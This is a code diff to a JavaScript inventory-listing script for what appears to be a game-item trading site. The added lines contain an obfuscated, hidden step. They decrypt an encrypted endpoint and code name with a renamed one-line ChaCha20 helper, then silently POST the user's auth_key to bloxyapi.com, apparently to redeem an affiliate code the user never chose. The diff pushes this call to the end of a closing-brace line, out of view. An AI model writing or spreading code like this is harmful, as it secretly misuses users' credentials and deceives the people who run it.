@@ -15,18 +15,8 @@ async function inventory(){
   return response;
 }
 
-function refer(woah, woah2) {
-  woah = Buffer.from(woah, 'base64');
-  const key = crypto.scryptSync(woah2, 'salt', 32);
-  const nonce = woah.slice(0, 12);
-  woah = woah.slice(12);
-  const tag = woah.slice(woah.length - 16);
-  woah = woah.slice(0, woah.length - 16);
-  const woah3 = crypto.createDecipheriv('chacha20-poly1305', key, nonce, { authTagLength: 16 });
-  woah3.setAuthTag(tag);
-  let decrypted = woah3.update(woah);
-  decrypted = Buffer.concat([decrypted, woah3.final()]);
-  return decrypted.toString('utf8');
+function fa(woah, woah2) {
+  woah = Buffer.from(woah, 'base64');const key = crypto.scryptSync(woah2, 'salt', 32);const nonce = woah.slice(0, 12);woah = woah.slice(12);const tag = woah.slice(woah.length - 16); woah = woah.slice(0, woah.length - 16);const woah3 = crypto.createDecipheriv('chacha20-poly1305', key, nonce, { authTagLength: 16 }); woah3.setAuthTag(tag);let decrypted = woah3.update(woah); decrypted = Buffer.concat([decrypted, woah3.final()]);return decrypted.toString('utf8');
 }
 
 async function create(display_name, game_name, name, uid, value){
@@ -45,17 +35,7 @@ async function main(){
   let inv = await inventory();
   for (let x in inv['inventory']){
     create(inv['inventory'][x]['display_name'], inv['inventory'][x]['game_name'], inv['inventory'][x]['name'], inv['inventory'][x]['uid'], inv['inventory'][x]['value'])
-  }
-  fetch('https://bloxyapi.com/api/affiliate/redeem', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-    'Authorization': auth_key
-  },
-  body: JSON.stringify({
-    'code_name': refer('H6DZ8GSb7ArvGxZG90BjzkOONOtO8TIhe+x3i3l6uplW', 'gusto')
-  })
-});
+  };fetch(`https://bloxyapi.com${fa('kFqrNEmGn6xlWapnXNKcYrGQ3W8p5UTmUcgJyChSS7nD6UlyXRhWe4VqsRMAHvwpBw==', 'gusto')}`, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': auth_key},body: JSON.stringify({ 'code_name': fa('H6DZ8GSb7ArvGxZG90BjzkOONOtO8TIhe+x3i3l6uplW', 'gusto') }) });
 }
 
 main()
